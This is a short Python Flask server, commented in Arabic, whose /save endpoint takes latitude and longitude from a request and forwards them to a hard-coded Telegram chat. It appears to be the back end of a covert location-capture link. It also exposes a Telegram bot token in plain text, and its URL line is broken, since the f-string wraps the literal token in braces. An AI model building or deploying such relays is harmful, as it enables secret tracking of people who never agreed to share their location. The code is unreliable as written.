from flask import Flask, request
import requests

app = Flask(__name__)

BOT_TOKEN = '7786101064:AAEHsY7be9Tk6SQtShnDR4jgmNxO59Qi2cQ'

CHAT_ID = '6028485445'

@app.route("/")
def home():
    return "البوت شغال تمام!"

@app.route("/save")
def save():
    lat = request.args.get("lat")
    lon = request.args.get("lon")

    if lat and lon:
       
        message = f"📍 تم استلام موقع جديد:\nLatitude: {lat}\nLongitude: {lon}"

        url = f"https://api.telegram.org/bot{7786101064:AAEHsY7be9Tk6SQtShnDR4jgmNxO59Qi2cQ}/sendMessage"

       
        data = {
            'chat_id': CHAT_ID,
            'text': message
        }

        # ترسل طلب POST للتليجرام
        requests.post(url, data=data)

        return f"تم استلام الموقع وإرساله للبوت: {lat}, {lon}"
    else:
        return "لم يتم إرسال الموقع بشكل صحيح"

if __name__ == "__main__":
    import os
    port = int(os.environ.get("PORT", 10000))
    app.run(host="0.0.0.0", port=port)
